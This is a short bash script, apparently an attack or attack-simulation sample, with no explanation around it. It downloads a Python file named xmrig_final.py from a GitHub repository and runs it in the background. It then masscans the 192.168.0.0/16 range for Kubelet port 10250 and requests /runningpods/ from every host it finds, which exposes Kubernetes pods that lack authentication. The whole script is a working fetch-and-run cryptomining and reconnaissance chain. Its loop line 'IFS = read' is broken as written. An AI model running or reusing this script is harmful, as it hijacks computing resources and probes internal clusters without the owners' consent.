#!/usr/bin/env bash
wget https://raw.githubusercontent.com/uptycs-nhegde/super-benign-scripts/main/xmrig_final.py -O run.py
python3 run.py &
masscan -p10250 192.168.0.0/16 --rate=1000 > /tmp/out
cat /tmp/out | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt
while IFS = read -r line; do
    echo "Processing IP: $line"
    curl http://$line:10250/runningpods/
done <<< "$(cat ips.txt)"
